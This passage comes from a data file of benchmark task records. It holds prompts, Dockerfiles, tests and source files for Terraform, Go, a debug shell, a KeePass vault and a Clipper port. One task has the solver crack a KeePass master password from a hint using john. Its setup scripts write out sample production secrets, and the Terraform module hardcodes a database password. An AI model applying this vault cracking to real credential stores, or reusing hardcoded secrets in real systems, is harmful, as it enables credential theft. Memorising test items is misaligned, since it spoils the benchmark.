{\n  description = \""AWS region\""\n  type        = string\n  default     = \""us-east-1\""\n}\n\nvariable \""vpc_cidr\"" {\n  description = \""VPC CIDR block\""\n  type        = string\n  default     = \""10.1.0.0/16\""\n}"", ""modules/eks/main.tf"": ""terraform {\n  required_providers {\n    aws = {\n      source  = \""hashicorp/aws\""\n      version = \"">= 4.50\""\n    }\n  }\n}\n\ndata \""aws_iam_policy_document\"" \""eks_assume_role\"" {\n  statement {\n    effect = \""Allow\""\n\n    principals {\n      type        = \""Service\""\n      identifiers = [\""eks.amazonaws.com\""]\n    }\n\n    actions = [\""sts:AssumeRole\""]\n  }\n}\n\nresource \""aws_iam_role\"" \""eks\"" {\n  name               = \""${var.environment}-eks-cluster-role\""\n  assume_role_policy = data.aws_iam_policy_document.eks_assume_role.json\n}\n\nresource \""aws_iam_role_policy_attachment\"" \""eks_cluster_policy\"" {\n  policy_arn = \""arn:aws:iam::aws:policy/AmazonEKSClusterPolicy\""\n  role       = aws_iam_role.eks.name\n}\n\nresource \""aws_eks_cluster\"" \""main\"" {\n  name     = \""${var.environment}-cluster\""\n  role_arn = aws_iam_role.eks.arn\n\n  vpc_config {\n    subnet_ids = var.subnet_ids\n  }\n\n  depends_on = [\n    aws_iam_role_policy_attachment.eks_cluster_policy\n  ]\n}"", ""modules/eks/variables.tf"": ""variable \""environment\"" {\n  description = \""Environment name\""\n  type        = string\n}\n\nvariable \""vpc_id\"" {\n  description = \""VPC ID\""\n  type        = string\n}\n\nvariable \""subnet_ids\"" {\n  description = \""Subnet IDs for EKS cluster\""\n  type        = list(string)\n}"", ""modules/vpc/outputs.tf"": ""output \""vpc_id\"" {\n  description = \""ID of the VPC\""\n  value       = aws_vpc.main.id\n}\n\noutput \""private_subnet_ids\"" {\n  description = \""IDs of private subnets\""\n  value       = aws_subnet.private[*].id\n}"", ""modules/vpc/main.tf"": ""terraform {\n  required_providers {\n    aws = {\n      source  = \""hashicorp/aws\""\n      version = \"">= 4.20\""\n    }\n  }\n}\n\nresource \""aws_vpc\"" \""main\"" {\n  cidr_block           = var.cidr_block\n  enable_dns_hostnames = true\n  enable_dns_support   = true\n\n  tags = {\n    Name        = \""${var.environment}-vpc\""\n    Environment = var.environment\n  }\n}\n\nresource \""aws_subnet\"" \""private\"" {\n  count = 2\n  \n  vpc_id            = aws_vpc.main.id\n  cidr_block        = cidrsubnet(var.cidr_block, 8, count.index)\n  availability_zone = data.aws_availability_zones.available.names[count.index]\n\n  tags = {\n    Name        = \""${var.environment}-private-${count.index + 1}\""\n    Environment = var.environment\n    Type        = \""private\""\n  }\n}\n\ndata \""aws_availability_zones\"" \""available\"" {\n  state = \""available\""\n}"", ""modules/vpc/variables.tf"": ""variable \""environment\"" {\n  description = \""Environment name\""\n  type        = string\n}\n\nvariable \""cidr_block\"" {\n  description = \""VPC CIDR block\""\n  type        = string\n}"", ""modules/rds/main.tf"": ""terraform {\n  required_providers {\n    aws = {\n      source  = \""hashicorp/aws\""\n      version = \"">= 4.0, < 6.0\""\n    }\n  }\n}\n\nresource \""aws_db_subnet_group\"" \""main\"" {\n  name       = \""${var.environment}-db-subnet\""\n  subnet_ids = var.subnet_ids\n\n  tags = {\n    Name        = \""${var.environment}-db-subnet-group\""\n    Environment = var.environment\n  }\n}\n\nresource \""aws_db_instance\"" \""main\"" {\n  identifier = \""${var.environment}-db\""\n  \n  allocated_storage    = 20\n  storage_type         = \""gp3\""\n  engine               = \""postgres\""\n  engine_version       = \""14.7\""\n  instance_class       = \""db.t3.micro\""\n  \n  db_name  = \""appdb\""\n  username = \""dbadmin\""\n  password = \""changeme123!\""\n  \n  db_subnet_group_name = aws_db_subnet_group.main.name\n  skip_final_snapshot  = true\n  \n  tags = {\n    Name        = \""${var.environment}-database\""\n    Environment = var.environment\n  }\n}"", ""modules/rds/variables.tf"": ""variable \""environment\"" {\n  description = \""Environment name\""\n  type        = string\n}\n\nvariable \""vpc_id\"" {\n  description = \""VPC ID\""\n  type        = string\n}\n\nvariable \""subnet_ids\"" {\n  description = \""Subnet IDs for database\""\n  type        = list(string)\n}""}",2025-07-21T17:06:58.682750,2025-07-21T17:06:58.682750
draft_dp_acc5ab98,hard,draft_dp_acc5ab98,debugging,The cloud-service build is broken after updating SDKs. Fix the dependency conflicts - AWS SDK needs golang.org/x/net v0.17.0 but GCP SDK requires v0.15.0. Make it compile and pass tests.,debugging,debugging|build-automation|cloud,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y wget git make python3 python3-pytest && \
    wget -q https://go.dev/dl/go1.21.13.linux-amd64.tar.gz && \
    tar -C /usr/local -xzf go1.21.13.linux-amd64.tar.gz && \
    rm go1.21.13.linux-amd64.tar.gz

ENV PATH=""/usr/local/go/bin:${PATH}""

WORKDIR /app

# Copy the broken go.mod that has conflicts
COPY go.mod.broken go.mod

# Copy source files
COPY main.go ./
COPY aws/ ./aws/
COPY gcp/ ./gcp/
COPY main_test.go ./

# Try to download dependencies - this will fail due to conflicts
RUN go mod download || true

# Show the error
RUN go mod tidy || true

SHELL [""/bin/bash"", ""-c""]","import subprocess
import os

def test_go_build_succeeds():
    """"""Test that the Go service builds successfully""""""
    result = subprocess.run(['go', 'build', '-o', 'cloud-service', '.'], 
                          capture_output=True, text=True, cwd='/app')
    assert result.returncode == 0, f""Build failed: {result.stderr}""
    assert os.path.exists('/app/cloud-service'), ""Binary not created""

def test_go_tests_pass():
    """"""Test that Go tests pass""""""
    result = subprocess.run(['go', 'test', './...'], 
                          capture_output=True, text=True, cwd='/app')
    assert result.returncode == 0, f""Tests failed: {result.stderr}""
    assert 'PASS' in result.stdout, ""Tests did not pass""","{""test_go_build_succeeds"": 0.6, ""test_go_tests_pass"": 0.4}","{""main.go"": ""package main\n\nimport (\n\t\""context\""\n\t\""fmt\""\n\t\""log\""\n\n\t\""cloud-service/aws\""\n\t\""cloud-service/gcp\""\n)\n\nfunc main() {\n\tctx := context.Background()\n\n\t// Initialize AWS client\n\tawsClient, err := aws.NewClient(ctx)\n\tif err != nil {\n\t\tlog.Fatalf(\""Failed to create AWS client: %v\"", err)\n\t}\n\tfmt.Println(\""AWS client initialized:\"", awsClient != nil)\n\n\t// Initialize GCP client  \n\tgcpClient, err := gcp.NewClient(ctx)\n\tif err != nil {\n\t\tlog.Fatalf(\""Failed to create GCP client: %v\"", err)\n\t}\n\tfmt.Println(\""GCP client initialized:\"", gcpClient != nil)\n\n\tfmt.Println(\""All cloud clients initialized successfully\"")\n}"", ""go.mod.broken"": ""module cloud-service\n\ngo 1.21\n\nrequire (\n\tgithub.com/aws/aws-sdk-go-v2 v1.24.1\n\tgithub.com/aws/aws-sdk-go-v2/config v1.26.6\n\tgithub.com/aws/aws-sdk-go-v2/service/s3 v1.47.8\n\tcloud.google.com/go/storage v1.28.1\n\tgolang.org/x/net v0.17.0 // indirect via AWS SDK\n)\n\nreplace golang.org/x/net => golang.org/x/net v0.15.0 // forced by GCP SDK"", ""main_test.go"": ""package main\n\nimport (\n\t\""context\""\n\t\""testing\""\n\n\t\""cloud-service/aws\""\n\t\""cloud-service/gcp\""\n)\n\nfunc TestCloudClients(t *testing.T) {\n\tctx := context.Background()\n\n\t// Test AWS client creation\n\tawsClient, err := aws.NewClient(ctx)\n\tif err != nil {\n\t\tt.Fatalf(\""Failed to create AWS client: %v\"", err)\n\t}\n\tif awsClient == nil {\n\t\tt.Fatal(\""AWS client is nil\"")\n\t}\n\n\t// Test GCP client creation\n\tgcpClient, err := gcp.NewClient(ctx)\n\tif err != nil {\n\t\tt.Fatalf(\""Failed to create GCP client: %v\"", err)\n\t}\n\tif gcpClient == nil {\n\t\tt.Fatal(\""GCP client is nil\"")\n\t}\n}"", ""gcp/client.go"": ""package gcp\n\nimport (\n\t\""context\""\n\n\t\""cloud.google.com/go/storage\""\n)\n\ntype Client struct {\n\tStorage *storage.Client\n}\n\nfunc NewClient(ctx context.Context) (*Client, error) {\n\tstorageClient, err := storage.NewClient(ctx)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &Client{\n\t\tStorage: storageClient,\n\t}, nil\n}"", ""aws/client.go"": ""package aws\n\nimport (\n\t\""context\""\n\n\t\""github.com/aws/aws-sdk-go-v2/config\""\n\t\""github.com/aws/aws-sdk-go-v2/service/s3\""\n)\n\ntype Client struct {\n\tS3 *s3.Client\n}\n\nfunc NewClient(ctx context.Context) (*Client, error) {\n\tcfg, err := config.LoadDefaultConfig(ctx)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &Client{\n\t\tS3: s3.NewFromConfig(cfg),\n\t}, nil\n}""}",2025-07-21T17:00:12.304458,2025-07-22T13:04:00.595490+00:00
draft_dp_60b2bf59,hard,draft_dp_60b2bf59,software-engineering,Need to implement network inspection in dsh and optimize the binary. Add a 'net' command to show TCP connections and reduce binary size to under 5MB using static linking with -ldflags.,software-engineering,optimization|networking|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Go
RUN apt-get update && apt-get install -y \
    golang-go \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /workspace

# Copy the source files
COPY main.go /workspace/
COPY processes.go /workspace/
COPY filesystem.go /workspace/
COPY embed_data.go /workspace/

# Build the binary with debug info and no optimizations (larger than 5MB)
RUN go build -gcflags=""-N -l"" -o dsh *.go

# Show size
RUN ls -lh dsh

# Test that it runs
RUN ./dsh help || true

# Create test directory structure
RUN mkdir -p /test/data && \
    echo ""test file"" > /test/data/sample.txt","import os
import subprocess
import json

def test_binary_size_under_5mb():
    """"""Test that the dsh binary is under 5MB""""""
    # Check if binary exists
    assert os.path.exists('/workspace/dsh'), ""dsh binary not found""
    
    # Get file size
    size = os.path.getsize('/workspace/dsh')
    size_mb = size / (1024 * 1024)
    
    assert size_mb < 5.0, f""Binary size {size_mb:.2f}MB exceeds 5MB limit""

def test_network_command_implemented():
    """"""Test that the net command shows network connections""""""
    # Send net command followed by exit to prevent hanging
    result = subprocess.run(
        ['bash', '-c', 'printf ""net\nexit\n"" | /workspace/dsh'],
        capture_output=True,
        text=True,
        timeout=10
    )
    
    # Should not show ""not implemented"" message
    assert ""not implemented"" not in result.stdout.lower(), ""Network command not implemented""
    assert ""connection"" in result.stdout.lower() or ""port"" in result.stdout.lower(), ""Network command should show connection info""","{""test_binary_size_under_5mb"": 0.4, ""test_network_command_implemented"": 0.6}","{""embed_data.go"": ""package main\n\n// Embed large string data to ensure binary is > 5MB initially\n// This simulates embedded assets, templates, or configuration data\nconst embeddedString1 = `Lorem ipsum dolor sit amet, consectetur adipiscing elit. ` + \n\t`Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. ` +\n\t`Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris. `\n\n// Generate a large amount of embedded data\nvar (\n\tembeddedData1 = [1024 * 1024 * 2]byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}\n\tembeddedData2 = [1024 * 1024 * 2]byte{11, 12, 13, 14, 15, 16, 17, 18, 19, 20}\n\tembeddedData3 = [1024 * 1024 * 2]byte{21, 22, 23, 24, 25, 26, 27, 28, 29, 30}\n\tlookupTable   = make(map[int]string)\n)\n\nfunc init() {\n\t// Initialize data to prevent optimization\n\tfor i := 0; i < 10000; i++ {\n\t\tlookupTable[i] = embeddedString1\n\t}\n\t\n\t// Fill arrays with patterns\n\tfor i := range embeddedData1 {\n\t\tembeddedData1[i] = byte(i % 256)\n\t\tembeddedData2[i] = byte((i * 2) % 256)\n\t\tembeddedData3[i] = byte((i * 3) % 256)\n\t}\n}"", ""filesystem.go"": ""package main\n\nimport (\n\t\""fmt\""\n\t\""strings\""\n\t\""syscall\""\n)\n\nfunc showFilesystemStats() {\n\tvar stat syscall.Statfs_t\n\t\n\tpaths := []string{\""/\"", \""/tmp\"", \""/var\"", \""/home\""}\n\t\n\tfmt.Printf(\""%-20s %-15s %-15s %-15s %-10s\\n\"", \""MOUNT\"", \""TOTAL\"", \""USED\"", \""AVAILABLE\"", \""USE%\"")\n\tfmt.Println(strings.Repeat(\""-\"", 75))\n\t\n\tfor _, path := range paths {\n\t\terr := syscall.Statfs(path, &stat)\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\t\n\t\ttotal := stat.Blocks * uint64(stat.Bsize)\n\t\tfree := stat.Bavail * uint64(stat.Bsize)\n\t\tused := total - free\n\t\t\n\t\ttotalMB := total / (1024 * 1024)\n\t\tusedMB := used / (1024 * 1024)\n\t\tfreeMB := free / (1024 * 1024)\n\t\t\n\t\tusePercent := 0\n\t\tif total > 0 {\n\t\t\tusePercent = int((used * 100) / total)\n\t\t}\n\t\t\n\t\tfmt.Printf(\""%-20s %-15s %-15s %-15s %-10s\\n\"",\n\t\t\tpath,\n\t\t\tfmt.Sprintf(\""%d MB\"", totalMB),\n\t\t\tfmt.Sprintf(\""%d MB\"", usedMB),\n\t\t\tfmt.Sprintf(\""%d MB\"", freeMB),\n\t\t\tfmt.Sprintf(\""%d%%\"", usePercent))\n\t}\n}"", ""processes.go"": ""package main\n\nimport (\n\t\""fmt\""\n\t\""io/ioutil\""\n\t\""strconv\""\n\t\""strings\""\n)\n\nfunc listProcesses() {\n\tfmt.Printf(\""%-10s %-20s %-10s %-10s\\n\"", \""PID\"", \""NAME\"", \""STATE\"", \""MEMORY\"")\n\tfmt.Println(strings.Repeat(\""-\"", 55))\n\t\n\tdirs, err := ioutil.ReadDir(\""/proc\"")\n\tif err != nil {\n\t\tfmt.Printf(\""Error reading /proc: %v\\n\"", err)\n\t\treturn\n\t}\n\t\n\tcount := 0\n\tfor _, dir := range dirs {\n\t\tif !dir.IsDir() {\n\t\t\tcontinue\n\t\t}\n\t\t\n\t\tpid, err := strconv.Atoi(dir.Name())\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\t\n\t\t// Read process info\n\t\tstatPath := fmt.Sprintf(\""/proc/%d/stat\"", pid)\n\t\tstatData, err := ioutil.ReadFile(statPath)\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\t\n\t\t// Parse basic info (simplified)\n\t\tparts := strings.Split(string(statData), \"" \"")\n\t\tif len(parts) < 3 {\n\t\t\tcontinue\n\t\t}\n\t\t\n\t\tname := strings.Trim(parts[1], \""()\"")\n\t\tstate := parts[2]\n\t\t\n\t\t// Read memory info\n\t\tstatusPath := fmt.Sprintf(\""/proc/%d/status\"", pid)\n\t\tstatusData, err := ioutil.ReadFile(statusPath)\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\t\n\t\tmemory := \""N/A\""\n\t\tfor _, line := range strings.Split(string(statusData), \""\\n\"") {\n\t\t\tif strings.HasPrefix(line, \""VmRSS:\"") {\n\t\t\t\tparts := strings.Fields(line)\n\t\t\t\tif len(parts) >= 2 {\n\t\t\t\t\tmemory = parts[1] + \"" \"" + parts[2]\n\t\t\t\t}\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\t\n\t\tfmt.Printf(\""%-10d %-20s %-10s %-10s\\n\"", pid, name, state, memory)\n\t\tcount++\n\t\tif count >= 20 {\n\t\t\tfmt.Println(\""... (showing first 20 processes)\"")\n\t\t\tbreak\n\t\t}\n\t}\n}"", ""main.go"": ""package main\n\nimport (\n\t\""bufio\""\n\t\""fmt\""\n\t\""os\""\n\t\""strings\""\n)\n\nfunc main() {\n\tfmt.Println(\""Debug Shell (dsh) v0.1\"")\n\tfmt.Println(\""Type 'help' for commands\"")\n\t\n\tscanner := bufio.NewScanner(os.Stdin)\n\tfor {\n\t\tfmt.Print(\""dsh> \"")\n\t\tif !scanner.Scan() {\n\t\t\tbreak\n\t\t}\n\t\t\n\t\tline := scanner.Text()\n\t\tparts := strings.Fields(line)\n\t\tif len(parts) == 0 {\n\t\t\tcontinue\n\t\t}\n\t\t\n\t\tswitch parts[0] {\n\t\tcase \""help\"":\n\t\t\tshowHelp()\n\t\tcase \""ps\"":\n\t\t\tlistProcesses()\n\t\tcase \""net\"":\n\t\t\tfmt.Println(\""Network inspection not implemented\"")\n\t\tcase \""fs\"":\n\t\t\tshowFilesystemStats()\n\t\tcase \""exit\"", \""quit\"":\n\t\t\tfmt.Println(\""Goodbye!\"")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Printf(\""Unknown command: %s\\n\"", parts[0])\n\t\t}\n\t}\n}\n\nfunc showHelp() {\n\tfmt.Println(\""Available commands:\"")\n\tfmt.Println(\""  ps    - List running processes\"")\n\tfmt.Println(\""  net   - Show network connections\"")\n\tfmt.Println(\""  fs    - Show filesystem statistics\"")\n\tfmt.Println(\""  help  - Show this help\"")\n\tfmt.Println(\""  exit  - Exit shell\"")\n}""}",2025-07-21T16:54:43.157543,2025-07-22T13:21:14.905430+00:00
draft_dp_8ff49697,medium,draft_dp_8ff49697,security,The config.kdbx file has our production database credentials but I forgot the master password. There's a hint.txt file that might help. Extract all the production configs to /app/extracted_config.json,security,python|data-extraction|decrypt,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required packages - using Python base image so most Python stuff is there
RUN apt-get update && apt-get install -y \
    keepassxc \
    john \
    && rm -rf /var/lib/apt/lists/*

# Install Python packages
RUN pip install pykeepass

# Copy setup files
COPY setup_keepass_v2.py /app/setup_keepass.py
COPY hint.txt /app/
COPY seasons.txt /app/

# Run setup to create KeePass database
RUN python /app/setup_keepass.py && rm /app/setup_keepass.py

CMD [""/bin/bash""]","import os
import json
import subprocess

def test_extracted_config_exists():
    """"""Test that the extracted configuration file exists at the correct location.""""""
    assert os.path.exists('/app/extracted_config.json'), ""extracted_config.json not found at /app/""
    
    # Verify it's a valid JSON file
    with open('/app/extracted_config.json', 'r') as f:
        data = json.load(f)  # This will raise if invalid JSON
    
    assert isinstance(data, (dict, list)), ""JSON file should contain a dict or list""

def test_production_entries_extracted():
    """"""Test that all production entries were extracted from KeePass.""""""
    with open('/app/extracted_config.json', 'r') as f:
        data = json.load(f)
    
    # Check for required production entries (should have at least 5 production entries)
    production_count = 0
    required_entries = ['Primary', 'Replica', 'Stripe', 'SendGrid', 'Redis']
    found_entries = []
    
    if isinstance(data, dict):
        # Check if data is organized by category
        for category, entries in data.items():
            if 'production' in category.lower():
                if isinstance(entries, dict):
                    production_count += len(entries)
                    found_entries.extend(entries.keys())
                elif isinstance(entries, list):
                    production_count += len(entries)
                    for entry in entries:
                        if isinstance(entry, dict) and 'name' in entry:
                            found_entries.append(entry.get('name', ''))
    elif isinstance(data, list):
        # Check if data is a flat list
        for entry in data:
            if isinstance(entry, dict):
                # Check various possible fields for ""production""
                if any('production' in str(v).lower() for v in entry.values()):
                    production_count += 1
                    found_entries.append(entry.get('title', entry.get('name', '')))
    
    # Should have at least 5 production entries
    assert production_count >= 5, f""Expected at least 5 production entries, found {production_count}""
    
    # Check that we found some of the expected entries
    found_required = sum(1 for req in required_entries if any(req.lower() in found.lower() for found in found_entries))
    assert found_required >= 3, f""Expected to find at least 3 of the required entries, found {found_required}""","{""test_extracted_config_exists"": 0.3, ""test_production_entries_extracted"": 0.7}","{""setup_keepass_v2.py"": ""#!/usr/bin/env python3\nfrom pykeepass import PyKeePass, create_database\nfrom pykeepass.entry import Entry\n\n# Create a new KeePass database\nmaster_password = \""Summer2023!\""\nkp = create_database(\""/app/config.kdbx\"", password=master_password)\n\n# Create groups\nprod_group = kp.add_group(kp.root_group, \""Production\"")\nprod_db_group = kp.add_group(prod_group, \""Database\"")\nprod_api_group = kp.add_group(prod_group, \""API\"")\nprod_cache_group = kp.add_group(prod_group, \""Cache\"")\ndev_group = kp.add_group(kp.root_group, \""Development\"")\ndev_db_group = kp.add_group(dev_group, \""Database\"")\nstaging_group = kp.add_group(kp.root_group, \""Staging\"")\nstaging_api_group = kp.add_group(staging_group, \""API\"")\n\n# Add entries\nkp.add_entry(prod_db_group, \""Primary\"", \""dbadmin\"", \""Pr0d#DB$2023!\"", url=\""prod-db-1.internal\"")\nkp.add_entry(prod_db_group, \""Replica\"", \""repl_user\"", \""R3pl!c@2023\"", url=\""prod-db-2.internal:5432\"")\nkp.add_entry(prod_api_group, \""Stripe\"", \""sk_live_4eC39HqLyjWDarjtT1zdp7dc\"", \""\"", url=\""https://api.stripe.com\"")\nkp.add_entry(prod_api_group, \""SendGrid\"", \""SG.IqYfGYgYSaem8xYP2EqNKQ.E0y4xGjXo8AXuEo3B_uYKWC_-2bkQjqTXqd_apTSjBAQ\"", \""\"", url=\""https://api.sendgrid.com\"")\nkp.add_entry(prod_cache_group, \""Redis\"", \""default\"", \""R3d!s#Pr0d2023\"", url=\""redis-prod.cache.internal:6379\"")\nkp.add_entry(dev_db_group, \""Test\"", \""testuser\"", \""testpass123\"", url=\""test-db.local\"")\nkp.add_entry(staging_api_group, \""Stripe\"", \""sk_test_BQokikJOvBiI2HlWgH4olfQ2\"", \""\"", url=\""https://api.stripe.com\"")\n\n# Save the database\nkp.save()\nprint(\""KeePass database created successfully\"")"", ""seasons.txt"": ""Spring\nSummer\nFall\nAutumn\nWinter"", ""setup_keepass.py"": ""#!/usr/bin/env python3\nimport subprocess\nimport time\n\n# Create KeePass database with known password\nmaster_password = \""Summer2023!\""\n\n# Create the database using keepassxc-cli\nsubprocess.run([\n    \""keepassxc-cli\"", \""db-create\"", \n    \""/app/config.kdbx\"",\n    \""--password\"", master_password\n], check=True)\n\n# Add production entries\nentries = [\n    (\""Production/Database/Primary\"", \""prod-db-1.internal\"", \""dbadmin\"", \""Pr0d#DB$2023!\""),\n    (\""Production/Database/Replica\"", \""prod-db-2.internal:5432\"", \""repl_user\"", \""R3pl!c@2023\""),\n    (\""Production/API/Stripe\"", \""sk_live_4eC39HqLyjWDarjtT1zdp7dc\"", \""\"", \""\""),\n    (\""Production/API/SendGrid\"", \""SG.IqYfGYgYSaem8xYP2EqNKQ.E0y4xGjXo8AXuEo3B_uYKWC_-2bkQjqTXqd_apTSjBAQ\"", \""\"", \""\""),\n    (\""Production/Cache/Redis\"", \""redis-prod.cache.internal:6379\"", \""default\"", \""R3d!s#Pr0d2023\""),\n    (\""Development/Database/Test\"", \""test-db.local\"", \""testuser\"", \""testpass123\""),\n    (\""Staging/API/Stripe\"", \""sk_test_BQokikJOvBiI2HlWgH4olfQ2\"", \""\"", \""\"")\n]\n\nfor path, url, username, password in entries:\n    cmd = [\n        \""keepassxc-cli\"", \""add\"",\n        \""/app/config.kdbx\"",\n        \""--password\"", master_password,\n        \""--username\"", username,\n        \""--url\"", url,\n        \""--generate\"" if not password else None,\n        path\n    ]\n    # Remove None values\n    cmd = [c for c in cmd if c is not None]\n    \n    if password:\n        # Use echo to provide password when not generating\n        subprocess.run(f\""echo '{password}' | {' '.join(cmd)}\"", shell=True, check=True)\n    else:\n        subprocess.run(cmd, check=True)\n\nprint(\""KeePass database created successfully\"")"", ""hint.txt"": ""Password hint from IT:\n- Season + Year format\n- Current season when this was created (mid-year 2023)\n- Ends with exclamation mark\n- First letter capitalized""}",2025-07-21T17:05:20.822527,2025-07-21T17:12:37.337390
draft_dp_476c837b,hard,draft_dp_476c837b,software-engineering,Need to port the legacy Clipper warehouse system at /app/legacy/WAREHOUSE.PRG to Python. Keep the DBF files compatible - other systems still read them. The pick list processing from /app/input/PICKS.TXT must produce identical results.,software-engineering,python|compiler-migration|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install dbf

# Create directory structure
RUN mkdir -p /app/legacy /app/input /app/output /app/data

# Copy files
COPY WAREHOUSE.PRG /app/legacy/
COPY create_dbf.py /tmp/
COPY setup_data.sh /tmp/
COPY PICKS.TXT /app/input/

# Set up DBF files
RUN chmod +x /tmp/setup_data.sh && /tmp/setup_data.sh && rm /tmp/create_dbf.py /tmp/setup_data.sh

WORKDIR /app","import os
import subprocess

def test_warehouse_py_exists():
    """"""Test that the Python port was created""""""
    assert os.path.exists('/app/warehouse.py'), ""warehouse.py not found""

def test_pick_processing_works():
    """"""Test that the ported system processes picks correctly""""""
    # Run the Python warehouse system
    result = subprocess.run(['python', '/app/warehouse.py'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Check that manifest was created
    assert os.path.exists('/app/output/manifest.txt'), ""Manifest not generated""
    
    # Check that movements log exists
    assert os.path.exists('/app/output/movements.log'), ""Movements log not created""
    
    # Verify movements log has the expected picks
    with open('/app/output/movements.log', 'r') as f:
        log_content = f.read()
        assert 'WIDGET001' in log_content
        assert '20' in log_content
        assert 'A01' in log_content","{""test_warehouse_py_exists"": 0.3, ""test_pick_processing_works"": 0.7}","{""PICKS.TXT"": ""WIDGET001|20|A01\nGADGET002|10|A02\nTOOL003|5|B01\nPART004|50|B02"", ""WAREHOUSE.PRG"": ""* WAREHOUSE.PRG - Inventory Management System\n* Clipper 5.2 Legacy Code\n\nPROCEDURE Main\n   LOCAL cPickFile, nHandle, cLine\n   LOCAL cProduct, nQty, cLocation\n   \n   SET DATE BRITISH\n   SET DELETED ON\n   \n   USE data/INVENTORY INDEX data/INVENTORY\n   USE data/LOCATIONS INDEX data/LOCATIONS NEW\n   \n   cPickFile = \""/app/input/PICKS.TXT\""\n   \n   IF FILE(cPickFile)\n      nHandle = FOPEN(cPickFile)\n      \n      DO WHILE !FEOF(nHandle)\n         cLine = FREADSTR(nHandle, 254)\n         \n         IF !EMPTY(cLine)\n            cProduct = SUBSTR(cLine, 1, AT(\""|\"", cLine) - 1)\n            cLine = SUBSTR(cLine, AT(\""|\"", cLine) + 1)\n            nQty = VAL(SUBSTR(cLine, 1, AT(\""|\"", cLine) - 1))\n            cLocation = SUBSTR(cLine, AT(\""|\"", cLine) + 1)\n            \n            ProcessPick(cProduct, nQty, cLocation)\n         ENDIF\n      ENDDO\n      \n      FCLOSE(nHandle)\n      GenerateManifest()\n   ENDIF\n   \n   CLOSE ALL\n   QUIT\nRETURN\n\nPROCEDURE ProcessPick(cProd, nQty, cLoc)\n   SELECT INVENTORY\n   SEEK cProd\n   \n   IF FOUND()\n      IF INVENTORY->QTY_ON_HAND >= nQty\n         REPLACE INVENTORY->QTY_ON_HAND WITH INVENTORY->QTY_ON_HAND - nQty\n         REPLACE INVENTORY->LAST_PICKED WITH DATE()\n         \n         LogMovement(cProd, nQty, cLoc)\n      ENDIF\n   ENDIF\nRETURN\n\nPROCEDURE LogMovement(cProd, nQty, cLoc)\n   LOCAL nOutFile\n   \n   nOutFile = FCREATE(\""/app/output/movements.log\"", 2)\n   FWRITE(nOutFile, DTOC(DATE()) + \"" \"" + cProd + \"" \"" + STR(nQty) + \"" \"" + cLoc + CHR(13) + CHR(10))\n   FCLOSE(nOutFile)\nRETURN\n\nPROCEDURE GenerateManifest()\n   LOCAL nManifest\n   \n   nManifest = FCREATE(\""/app/output/manifest.txt\"")\n   FWRITE(nManifest, \""SHIPPING MANIFEST\"" + CHR(13) + CHR(10))\n   FWRITE(nManifest, \""Generated: \"" + DTOC(DATE()) + CHR(13) + CHR(10))\n   FWRITE(nManifest, \""Pick processing complete\"" + CHR(13) + CHR(10))\n   FCLOSE(nManifest)\nRETURN"", ""create_dbf.py"": ""#!/usr/bin/env python3\nimport struct\nimport datetime\n\ndef create_dbf(filename, fields, records):\n    \""\""\""Create a simple DBF file\""\""\""\n    with open(filename, 'wb') as f:\n        # DBF Header\n        f.write(b'\\x03')  # DBF version\n        now = datetime.datetime.now()\n        f.write(struct.pack('BBB', now.year - 1900, now.month, now.day))\n        f.write(struct.pack('<I', len(records)))  # Number of records\n        \n        header_size = 32 + len(fields) * 32 + 1\n        record_size = sum(field[2] for field in fields) + 1  # +1 for delete flag\n        \n        f.write(struct.pack('<H', header_size))  # Header size\n        f.write(struct.pack('<H', record_size))  # Record size\n        f.write(b'\\x00' * 20)  # Reserved\n        \n        # Field descriptors\n        for field in fields:\n            name, ftype, length = field\n            f.write(name.ljust(11, '\\x00').encode('ascii'))\n            f.write(ftype.encode('ascii'))\n            f.write(b'\\x00' * 4)  # Reserved\n            f.write(struct.pack('B', length))\n            f.write(b'\\x00' * 15)  # Reserved\n        \n        f.write(b'\\x0D')  # Header terminator\n        \n        # Records\n        for record in records:\n            f.write(b' ')  # Not deleted\n            for i, field in enumerate(fields):\n                value = str(record[i])\n                f.write(value.ljust(field[2]).encode('ascii'))\n\n# Create INVENTORY.DBF\ninventory_fields = [\n    ('PRODUCT', 'C', 10),\n    ('DESCRIPTION', 'C', 30),\n    ('QTY_ON_HAND', 'N', 10),\n    ('LAST_PICKED', 'D', 8)\n]\n\ninventory_records = [\n    ('WIDGET001', 'Standard Widget', '     100', '20240115'),\n    ('GADGET002', 'Premium Gadget', '      50', '20240110'),\n    ('TOOL003', 'Industrial Tool', '      25', '20240105'),\n    ('PART004', 'Replacement Part', '     200', '20240112')\n]\n\ncreate_dbf('INVENTORY.DBF', inventory_fields, inventory_records)\n\n# Create LOCATIONS.DBF\nlocation_fields = [\n    ('LOCATION', 'C', 10),\n    ('DESCRIPTION', 'C', 30),\n    ('ZONE', 'C', 5)\n]\n\nlocation_records = [\n    ('A01', 'Aisle A Bin 01', 'PICK'),\n    ('A02', 'Aisle A Bin 02', 'PICK'),\n    ('B01', 'Aisle B Bin 01', 'BULK'),\n    ('B02', 'Aisle B Bin 02', 'BULK')\n]\n\ncreate_dbf('LOCATIONS.DBF', location_fields, location_records)\n\n# Create simple index files (NDX) - just placeholders\nwith open('INVENTORY.NDX', 'wb') as f:\n    f.write(b'NDX\\x00' + b'\\x00' * 512)\n\nwith open('LOCATIONS.NDX', 'wb') as f:\n    f.write(b'NDX\\x00' + b'\\x00' * 512)"", ""setup_data.sh"": ""#!/bin/bash\ncd /app/data\npython3 